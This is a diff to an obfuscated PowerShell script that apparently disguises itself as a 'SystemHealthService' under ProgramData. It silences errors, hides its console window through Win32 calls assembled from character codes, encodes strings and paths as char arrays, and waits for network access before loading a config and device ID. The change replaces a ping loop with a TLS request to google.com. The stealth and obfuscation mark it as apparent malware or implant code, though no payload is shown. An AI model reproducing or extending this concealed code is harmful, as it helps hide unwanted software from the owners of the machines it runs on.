@@ -1,7 +1,8 @@
 ${_0x1}="SilentlyContinue";$ErrorActionPreference=${_0x1};$ProgressPreference=${_0x1}
 try{${_d}='[DllImport("'+(-join([char]75,[char]101,[char]114,[char]110,[char]101,[char]108,[char]51,[char]50,[char]46,[char]100,[char]108,[char]108))+'")]public static extern IntPtr GetConsoleWindow();[DllImport("'+(-join([char]117,[char]115,[char]101,[char]114,[char]51,[char]50,[char]46,[char]100,[char]108,[char]108))+'")]public static extern bool ShowWindow(IntPtr h,Int32 n);';Add-Type -Name X0 -Namespace Y0 -MemberDefinition ${_d};[void][Y0.X0]::ShowWindow([Y0.X0]::GetConsoleWindow(),0)}catch{}
 ${_bp}=-join @([char]67,[char]58,[char]92,[char]80,[char]114,[char]111,[char]103,[char]114,[char]97,[char]109,[char]68,[char]97,[char]116,[char]97,[char]92,[char]83,[char]121,[char]115,[char]116,[char]101,[char]109,[char]72,[char]101,[char]97,[char]108,[char]116,[char]104,[char]83,[char]101,[char]114,[char]118,[char]105,[char]99,[char]101)
-while(!(&([char]84+[char]101+[char]115+[char]116+[char]45+[char]67+[char]111+[char]110+[char]110+[char]101+[char]99+[char]116+[char]105+[char]111+[char]110) -ComputerName "8.8.8.8" -Count 1 -Quiet)){Start-Sleep 5};Start-Sleep 5
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+while($true){try{$null=Invoke-RestMethod -Uri "https://www.google.com" -Method Head -TimeoutSec 5;break}catch{Start-Sleep 5}};Start-Sleep 5
 ${_cfg}=Get-Content "${_bp}\config.json" -Raw|ConvertFrom-Json;${_df}="${_bp}\device_id.txt"
 ${_mw}=60;${_w}=0;while(!(Test-Path ${_df}) -and ${_w} -lt ${_mw}){Start-Sleep 5;${_w}+=5}
 if(!(Test-Path ${_df})){${_did}=[guid]::NewGuid().ToString();${_did}|Out-File ${_df} -NoNewline}else{${_did}=(Get-Content ${_df} -Raw).Trim()}
